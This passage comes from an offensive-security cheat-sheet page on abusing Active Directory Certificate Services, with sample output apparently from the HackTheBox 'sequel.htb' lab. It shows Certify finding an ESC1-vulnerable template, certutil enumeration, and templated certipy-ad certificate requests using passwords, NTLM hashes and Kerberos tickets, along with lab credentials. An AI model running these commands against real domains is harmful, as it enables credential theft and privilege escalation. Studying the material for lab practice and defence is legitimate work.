</span></span></span><span class="line"><span class="cl"><span class="go"> | |    / _ \ '__| __| |  _| | | |   
</span></span></span><span class="line"><span class="cl"><span class="go"> | |___|  __/ |  | |_| | | | |_| |   
</span></span></span><span class="line"><span class="cl"><span class="go">  \_____\___|_|   \__|_|_|  \__, |   
</span></span></span><span class="line"><span class="cl"><span class="go">                             __/ |   
</span></span></span><span class="line"><span class="cl"><span class="go">                            |___./   
</span></span></span><span class="line"><span class="cl"><span class="go">  v2.0.0                         
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Find certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Classifying vulnerabilities in the context of the current user ('sequel\Ryan.Cooper') and its unrolled groups.
</span></span></span><span class="line"><span class="cl"><span class="go">[X] AuthWithChannelBinding HTTP request for URL 'http://dc.sequel.htb/certsrv/' failed with error: An error occurred while sending the request.
</span></span></span><span class="line"><span class="cl"><span class="go">[X] AuthWithChannelBinding HTTP request for URL 'https://dc.sequel.htb/certsrv/' failed with error: An error occurred while sending the request.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Listing info about the enterprise certificate authority 'sequel-DC-CA'
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Enterprise CA Name            : sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    DNS Hostname                  : dc.sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">    FullName                      : dc.sequel.htb\sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Start Date               : 11/18/2022 12:58:46 PM
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert End Date                 : 11/18/2121 1:08:46 PM
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    User Specifies SAN            : Disabled
</span></span></span><span class="line"><span class="cl"><span class="go">    RPC Request Encryption        : Enabled
</span></span></span><span class="line"><span class="cl"><span class="go">    CA Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">      Owner: BUILTIN\Administrators             S-1-5-32-544
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      Access Rights                                     Principal
</span></span></span><span class="line"><span class="cl"><span class="go">      Allow  Enroll                                     NT AUTHORITY\Authenticated Users   S-1-5-11
</span></span></span><span class="line"><span class="cl"><span class="go">      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators             S-1-5-32-544
</span></span></span><span class="line"><span class="cl"><span class="go">      Allow  ManageCA, ManageCertificates               sequel\Domain Admins               S-1-5-21-4078382237-1492182817-2568127209-512
</span></span></span><span class="line"><span class="cl"><span class="go">      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins           S-1-5-21-4078382237-1492182817-2568127209-519
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollment Agent Restrictions : None
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate templates found using the current filter parameters:
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Template Name                         : UserAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">    Enabled                               : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Publishing CAs                        : dc.sequel.htb\sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    Schema Version                        : 2
</span></span></span><span class="line"><span class="cl"><span class="go">    Validity Period                       : 10 years
</span></span></span><span class="line"><span class="cl"><span class="go">    Renewal Period                        : 6 weeks
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Name Flag                 : ENROLLEE_SUPPLIES_SUBJECT
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
</span></span></span><span class="line"><span class="cl"><span class="go">    Manager Approval Required             : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Authorized Signatures Required        : 0
</span></span></span><span class="line"><span class="cl"><span class="go">    Extended Key Usage                    : Client Authentication, Encrypting File System, Secure Email
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Application Policies      : Client Authentication, Encrypting File System, Secure Email
</span></span></span><span class="line"><span class="cl"><span class="go">    Vulnerabilities
</span></span></span><span class="line"><span class="cl"><span class="go">      ESC1                                : The template has a client authentication EKU and allows enrollees to supply subject.
</span></span></span><span class="line"><span class="cl"><span class="go">    Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">      Enrollment Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">        Enrollment Rights           : sequel\Domain Admins               S-1-5-21-4078382237-1492182817-2568127209-512
</span></span></span><span class="line"><span class="cl"><span class="go">                                      sequel\Domain Users                S-1-5-21-4078382237-1492182817-2568127209-513
</span></span></span><span class="line"><span class="cl"><span class="go">                                      sequel\Enterprise Admins           S-1-5-21-4078382237-1492182817-2568127209-519
</span></span></span><span class="line"><span class="cl"><span class="go">      Object Control Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">        Owner                       : sequel\Administrator               S-1-5-21-4078382237-1492182817-2568127209-500
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Owner                 : sequel\Administrator               S-1-5-21-4078382237-1492182817-2568127209-500
</span></span></span><span class="line"><span class="cl"><span class="go">                                      sequel\Domain Admins               S-1-5-21-4078382237-1492182817-2568127209-512
</span></span></span><span class="line"><span class="cl"><span class="go">                                      sequel\Enterprise Admins           S-1-5-21-4078382237-1492182817-2568127209-519
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Dacl                  : sequel\Administrator               S-1-5-21-4078382237-1492182817-2568127209-500
</span></span></span><span class="line"><span class="cl"><span class="go">                                      sequel\Domain Admins               S-1-5-21-4078382237-1492182817-2568127209-512
</span></span></span><span class="line"><span class="cl"><span class="go">                                      sequel\Enterprise Admins           S-1-5-21-4078382237-1492182817-2568127209-519
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Property              : sequel\Administrator               S-1-5-21-4078382237-1492182817-2568127209-500
</span></span></span><span class="line"><span class="cl"><span class="go">                                      sequel\Domain Admins               S-1-5-21-4078382237-1492182817-2568127209-512
</span></span></span><span class="line"><span class="cl"><span class="go">                                      sequel\Enterprise Admins           S-1-5-21-4078382237-1492182817-2568127209-519
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Certify completed in 00:00:15.8331578
</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set1-2" data-tabcontent="tab2"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check env
</span></span><span class="line"><span class="cl"><span class="go">certutil
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\Users\Administrator\Documents&gt; certutil
</span></span></span><span class="line"><span class="cl"><span class="go">Entry 0: (Local)
</span></span></span><span class="line"><span class="cl"><span class="go">  Name:                         "sequel-DC-CA"
</span></span></span><span class="line"><span class="cl"><span class="go">  Organizational Unit:          ""
</span></span></span><span class="line"><span class="cl"><span class="go">  Organization:                 ""
</span></span></span><span class="line"><span class="cl"><span class="go">  Locality:                     ""
</span></span></span><span class="line"><span class="cl"><span class="go">  State:                        ""
</span></span></span><span class="line"><span class="cl"><span class="go">  Country/region:               ""
</span></span></span><span class="line"><span class="cl"><span class="go">  Config:                       "dc.sequel.htb\sequel-DC-CA"
</span></span></span><span class="line"><span class="cl"><span class="go">  Exchange Certificate:         ""
</span></span></span><span class="line"><span class="cl"><span class="go">  Signature Certificate:        "dc.sequel.htb_sequel-DC-CA.crt"
</span></span></span><span class="line"><span class="cl"><span class="go">  Description:                  ""
</span></span></span><span class="line"><span class="cl"><span class="go">  Server:                       "dc.sequel.htb"
</span></span></span><span class="line"><span class="cl"><span class="go">  Authority:                    "sequel-DC-CA"
</span></span></span><span class="line"><span class="cl"><span class="go">  Sanitized Name:               "sequel-DC-CA"
</span></span></span><span class="line"><span class="cl"><span class="go">  Short Name:                   "sequel-DC-CA"
</span></span></span><span class="line"><span class="cl"><span class="go">  Sanitized Short Name:         "sequel-DC-CA"
</span></span></span><span class="line"><span class="cl"><span class="go">  Flags:                        "13"
</span></span></span><span class="line"><span class="cl"><span class="go">  Web Enrollment Servers:       ""
</span></span></span><span class="line"><span class="cl"><span class="go">CertUtil: -dump command completed successfully.
</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> List cert templates
</span></span><span class="line"><span class="cl"><span class="go">certutil -catemplates
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\Users\Administrator\Documents&gt; certutil -catemplates
</span></span></span><span class="line"><span class="cl"><span class="go">UserAuthentication: UserAuthentication -- Auto-Enroll: Access is denied.
</span></span></span><span class="line"><span class="cl"><span class="go">DirectoryEmailReplication: Directory Email Replication -- Auto-Enroll: Access is denied.
</span></span></span><span class="line"><span class="cl"><span class="go">DomainControllerAuthentication: Domain Controller Authentication -- Auto-Enroll: Access is denied.
</span></span></span><span class="line"><span class="cl"><span class="go">KerberosAuthentication: Kerberos Authentication -- Auto-Enroll: Access is denied.
</span></span></span><span class="line"><span class="cl"><span class="go">EFSRecovery: EFS Recovery Agent -- Auto-Enroll: Access is denied.
</span></span></span><span class="line"><span class="cl"><span class="go">EFS: Basic EFS -- Auto-Enroll: Access is denied.
</span></span></span><span class="line"><span class="cl"><span class="go">DomainController: Domain Controller -- Auto-Enroll: Access is denied.
</span></span></span><span class="line"><span class="cl"><span class="go">WebServer: Web Server -- Auto-Enroll: Access is denied.
</span></span></span><span class="line"><span class="cl"><span class="go">Machine: Computer -- Auto-Enroll: Access is denied.
</span></span></span><span class="line"><span class="cl"><span class="go">User: User -- Auto-Enroll: Access is denied.
</span></span></span><span class="line"><span class="cl"><span class="go">SubCA: Subordinate Certification Authority -- Auto-Enroll: Access is denied.
</span></span></span><span class="line"><span class="cl"><span class="go">Administrator: Administrator -- Auto-Enroll: Access is denied.
</span></span></span><span class="line"><span class="cl"><span class="go">CertUtil: -CATemplates command completed successfully.
</span></span></span></div></pre></div></div></div>
</div></div>

<p></p>
<hr>
<h3 id="request-a-personal-information-exchange-file-pfx">Request a Personal Information Exchange File (.pfx)</h3>
<p class="tabs">
<button data-tabset="set3" data-tabcontent="tab1" class="active">Linux</button>

<button data-tabset="set3" data-tabcontent="tab2">Windows</button>

</p><div class="tabset-wrapper" data-tabset-group="set3"><div class="tabcontent active" data-tabset="set3" data-tabcontent="tab1"><h4 id="1-request-a-certificate">1. Request a Certificate</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template User -target <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ryan.cooper'</span> -p <span class="s1">'NuclearMosquito3'</span> -ca sequel-DC-CA -template User -target dc.sequel.htb -ns 10.129.33.22 -pfx <span class="s1">'ryan.cooper.pfx'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 16
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Ryan.Cooper@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'ryan.cooper.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'ryan.cooper.pfx'
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template User -target <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ryan.cooper'</span> -hashes 98981eed8e9ce0763bb3c5b3c7ed5945 -ca sequel-DC-CA -template User -target dc.sequel.htb -ns 10.129.33.22 -pfx <span class="s1">'ryan.cooper.pfx'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 19
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Ryan.Cooper@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'ryan.cooper.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'ryan.cooper.pfx'
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template User -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ryan.cooper@sequel.htb'</span> -p <span class="s1">'NuclearMosquito3'</span> -k -ca sequel-DC-CA -template User -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -pfx <span class="s1">'ryan.cooper.pfx'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 14
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Ryan.Cooper@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'ryan.cooper.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'ryan.cooper.pfx'
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -k -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template User -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ryan.cooper@sequel.htb'</span> -hashes 98981eed8e9ce0763bb3c5b3c7ed5945 -k -ca sequel-DC-CA -template User -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -pfx <span class="s1">'ryan.cooper.pfx'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 20
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Ryan.Cooper@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'ryan.cooper.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'ryan.cooper.pfx'
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template User -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ryan.cooper@sequel.htb'</span> -k -ca sequel-DC-CA -template User -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -pfx <span class="s1">'ryan.cooper.pfx'</span>                                
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 21
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'Ryan.Cooper@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate has no object SID
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Try using -sid to set the object SID or see the wiki for more details
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'ryan.cooper.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'ryan.cooper.pfx'
</span></span></span></div></pre></div><h4 id="2-get-ntlm-hash">2. Get NTLM Hash</h4>
